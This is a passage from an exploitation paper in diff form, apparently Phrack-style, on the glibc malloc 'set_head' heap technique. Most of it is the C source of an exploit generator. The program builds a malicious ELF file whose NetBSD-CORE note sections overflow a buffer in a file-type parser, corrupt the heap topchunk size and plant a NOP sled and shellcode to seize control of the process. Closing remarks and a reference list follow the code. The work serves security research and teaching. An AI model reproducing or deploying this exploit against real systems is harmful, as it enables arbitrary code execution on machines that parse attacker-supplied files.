+    put_byte (ptr + 2, data >> 16);
+    put_byte (ptr + 3, data >> 24);
+}
+
+
+FILE *
+open_file (char *filename) {
+
+    FILE *fp;
+
+    fp = fopen ( filename , "w" );
+
+    if (!fp) {
+        perror ("Cant open file");
+        exit (1);
+    }
+
+    return fp;
+}
+
+void
+usage (char *progname) {
+
+    printf ("\nTo use:\n");
+    printf ("%s <return location> <return address> ", progname);
+    printf ("<topchunk location> <output filename>\n\n");
+
+    exit (1);
+}
+
+
+int
+main (int argc, char *argv[]) {
+
+    FILE *fp;
+    Elf32_Ehdr *elfhdr;
+    Elf32_Shdr *elfshdr;
+    Elf32_Nhdr *elfnhdr;
+    char *filename;
+    char *buffer, *ptr;
+    int i;
+    struct math *math;
+    struct sethead *shead;
+    int left_bytes;
+    unsigned long retloc, retadr, toploc;
+    unsigned long topchunk_size, malloc_size;
+
+    if ( argc != 5) {
+        usage ( argv[0] );
+    }
+
+    sscanf (argv[1], "0x%x", &retloc);
+    sscanf (argv[2], "0x%x", &retadr);
+    sscanf (argv[3], "0x%x", &toploc);
+
+    filename = (char *) malloc (256);
+    if (filename == NULL) {
+        printf ("--[ Cannot allocate memory for filename...\n");
+        exit (1);
+    }
+    strncpy (filename, argv[4], 255);
+
+    buffer = (char *) malloc (8192);
+    if (buffer == NULL) {
+        printf ("--[ Cannot allocate memory for file buffer\n");
+        exit (1);
+    }
+    memset (buffer, 0, 8192);
+
+    math = compute (1036);
+    if (!math) {
+        printf ("--[ Unable to compute a value\n");
+        exit (1);
+    }
+
+    shead = set_head_compute (retloc, retadr, toploc);
+    topchunk_size = shead->topchunk_size;
+    malloc_size = shead->malloc_size;
+
+
+    ptr = buffer;
+    elfhdr = (Elf32_Ehdr *) ptr;
+
+    // Fill our ELF header
+    sprintf(elfhdr->e_ident,"\x7f\x45\x4c\x46\x01\x01\x01");
+    elfhdr->e_type =            2;       // ET_EXEC
+    elfhdr->e_machine =         3;       // EM_386
+    elfhdr->e_version =         1;       // EV_CURRENT
+    elfhdr->e_entry =           0;
+    elfhdr->e_phoff =           0;
+    elfhdr->e_shoff =           52;
+    elfhdr->e_flags =           0;
+    elfhdr->e_ehsize =          52;
+    elfhdr->e_phentsize =       32;
+    elfhdr->e_phnum =           0;
+    elfhdr->e_shentsize =       40;
+    elfhdr->e_shnum =           math->nnetbsd + 2;
+    elfhdr->e_shstrndx =        0;
+
+
+    ptr += elfhdr->e_ehsize;
+    elfshdr = (Elf32_Shdr *) ptr;
+
+    // This loop lets us eat an arbitrary number of bytes in ms->o.buf
+    left_bytes = math->nname;
+    for (i = 0; i < math->nnetbsd; i++) {
+        elfshdr->sh_name        = 0;
+        elfshdr->sh_type        = 7;   // SHT_NOTE
+        elfshdr->sh_flags       = 0;
+        elfshdr->sh_addr        = 0;
+        elfshdr->sh_size        = 256;
+        elfshdr->sh_link        = 0;
+        elfshdr->sh_info        = 0;
+        elfshdr->sh_addralign   = 0;
+        elfshdr->sh_entsize     = 0;
+
+        if (left_bytes > 31) {
+            // filename == 31
+            elfshdr->sh_offset = OFFSET_31_BYTES;
+            left_bytes -= 31;
+        } else if (left_bytes != 0) {
+            // filename < 31 && != 0
+            elfshdr->sh_offset = OFFSET_N_BYTES;
+            left_bytes = 0;
+        } else {
+            // filename == 0
+            elfshdr->sh_offset = OFFSET_0_BYTES;
+        }
+
+        // The first section header will also let us load
+        // the shellcode in memory :)
+        // Indeed, by requesting a large memory block,
+        // the topchunk will be splitted, and this memory region
+        // will be left untouched until we need it.
+        // We assume its name is 31 bytes long.
+        if (i == 0) {
+            elfshdr->sh_size = 4096;
+            elfshdr->sh_offset = OFFSET_SHELLCODE;
+        }
+
+        elfshdr++;
+    }
+
+
+    // This section header entry is for the data that will
+    // overwrite the topchunk size pointer
+    elfshdr->sh_name        = 0;
+    elfshdr->sh_type        = 7;      // SHT_NOTE
+    elfshdr->sh_flags       = 0;
+    elfshdr->sh_addr        = 0;
+    elfshdr->sh_offset      = OFFSET_OVERWRITE;
+    elfshdr->sh_size        = 256;
+    elfshdr->sh_link        = 0;
+    elfshdr->sh_info        = 0;
+    elfshdr->sh_addralign   = 0;
+    elfshdr->sh_entsize     = 0;
+    elfshdr++;
+
+
+    // This section header entry triggers the call to malloc
+    // with a user supplied length.
+    // It is a requirement for the set_head technique to work
+    elfshdr->sh_name        = 0;
+    elfshdr->sh_type        = 7;     // SHT_NOTE
+    elfshdr->sh_flags       = 0;
+    elfshdr->sh_addr        = 0;
+    elfshdr->sh_offset      = OFFSET_N_BYTES;
+    elfshdr->sh_size        = malloc_size;
+    elfshdr->sh_link        = 0;
+    elfshdr->sh_info        = 0;
+    elfshdr->sh_addralign   = 0;
+    elfshdr->sh_entsize     = 0;
+    elfshdr++;
+
+
+    // This note entry lets us eat 31 bytes + overhead
+    elfnhdr = (Elf32_Nhdr *) (buffer + OFFSET_31_BYTES);
+    elfnhdr->n_namesz       = 12;
+    elfnhdr->n_descsz       = 12;
+    elfnhdr->n_type         = 1;
+    ptr = buffer + OFFSET_31_BYTES + 12;
+    sprintf (ptr, "NetBSD-CORE");
+    sprintf (buffer + OFFSET_31_BYTES + 24 + 0x7c,
+        "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB");
+
+
+    // This note entry lets us eat an arbitrary number of bytes + overhead
+    elfnhdr = (Elf32_Nhdr *) (buffer + OFFSET_N_BYTES);
+    elfnhdr->n_namesz       = 12;
+    elfnhdr->n_descsz       = 12;
+    elfnhdr->n_type         = 1;
+    ptr = buffer + OFFSET_N_BYTES + 12;
+    sprintf (ptr, "NetBSD-CORE");
+    for (i = 0; i < (math->nname % 31); i++)
+        buffer[OFFSET_N_BYTES+24+0x7c+i]='B';
+
+
+    // This note entry lets us eat 0 bytes + overhead
+    elfnhdr = (Elf32_Nhdr *) (buffer + OFFSET_0_BYTES);
+    elfnhdr->n_namesz       = 12;
+    elfnhdr->n_descsz       = 12;
+    elfnhdr->n_type         = 1;
+    ptr = buffer + OFFSET_0_BYTES + 12;
+    sprintf (ptr, "NetBSD-CORE");
+    buffer[OFFSET_0_BYTES+24+0x7c]=0;
+
+
+    // This note entry lets us specify the value that will
+    // overwrite the topchunk size
+    elfnhdr = (Elf32_Nhdr *) (buffer + OFFSET_OVERWRITE);
+    elfnhdr->n_namesz       = 12;
+    elfnhdr->n_descsz       = 12;
+    elfnhdr->n_type         = 1;
+    ptr = buffer + OFFSET_OVERWRITE + 12;
+    sprintf (ptr, "NetBSD-CORE");
+    // Put the new topchunk size 7 times in memory
+    // The note entry program name is at a specific, odd offset (24+0x7c)?
+    for (i = 0; i < 7; i++)
+        put_longword (buffer + OFFSET_OVERWRITE + 24 + 0x7c + (i * 4),
+            topchunk_size);
+
+
+    // This note entry lets us eat 31 bytes + overhead, but
+    // its real purpose is to load the shellcode in memory.
+    // We assume that its name is 31 bytes long.
+    elfnhdr = (Elf32_Nhdr *) (buffer + OFFSET_SHELLCODE);
+    elfnhdr->n_namesz       = 12;
+    elfnhdr->n_descsz       = 12;
+    elfnhdr->n_type         = 1;
+    ptr = buffer + OFFSET_SHELLCODE + 12;
+    sprintf (ptr, "NetBSD-CORE");
+    sprintf (buffer + OFFSET_SHELLCODE + 24 + 0x7c,
+         "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB");
+
+
+    // Fill this memory region with our shellcode.
+    // Remember to leave the note entry untouched ...
+    memset (buffer + OFFSET_SHELLCODE + 256, 0x90, 4096-256);
+    sprintf (buffer + 8191 - strlen (scode), scode);
+
+
+    fp = open_file (filename);
+    if (fwrite (buffer, 8192, 1, fp) != 0 ) {
+        printf ("--[ The file has been written\n");
+    } else {
+        printf ("--[ Can not write to the file\n");
+        exit (1);
+    }
+    fclose (fp);
+
+
+    free (shead);
+    free (math);
+    free (buffer);
+    free (filename);
+
+
+    return 0;
+}
+
+
+--[ 7 - Final words
+
+That's all for the details of this technique; a lot has already been said
+through this paper.  By looking at the complexity of the malloc code, there
+are probably many other ways to take control of a process by corrupting the
+malloc chunks.
+
+Of course, this paper explains the technical details of set_head, but
+personally, I think that all the exploitation techniques are ephemeral.
+This is more true, especially recently, with all the low level security
+controls that were added to the modern operating systems.  Beside having
+great technical skills, I personally think it's important to develop your
+mental skills and your creativity.  Try to improve your attitude when
+solving a difficult problem.  Develop your perseverance and determination,
+even though you may have failed at the same thing 20, 50 or 100 times in a
+row.
+
+I would like to greet the following individuals: bond, dp, jinx,
+Michael and nitr0gen.  There is more people that I forget. Thanks for the
+help and the great conversations we had over the last few years.
+
+
+--[ 8 - References
+
+1. Solar Designer, http://www.openwall.com/advisories/OW-002-netscape-jpeg/
+
+2. Anonymous, http://www.phrack.org/archives/57/p57-0x09
+
+3. Kaempf, Michel, http://www.phrack.org/archives/57/p57-0x08
+
+4. Phantasmal Phantasmagoria,
+http://www.packetstormsecurity.org/papers/attack/MallocMaleficarum.txt
+
+5. Phantasmal Phantasmagoria,
+http://seclists.org/vuln-dev/2004/Feb/0025.html
+
+6. jp,
+http://www.phrack.org/archives/61/p61-0x06_Advanced_malloc_exploits.txt
+
+7. Guay-Leroux, Jean-Sebastien, http://www.guay-leroux.com/projects.html
+
+8. gera, http://www.phrack.org/archives/59/p59-0x07.txt
+
+9. The Shellcoder's Handbook: Discovering and Exploiting Security Holes
+(2004), Wiley
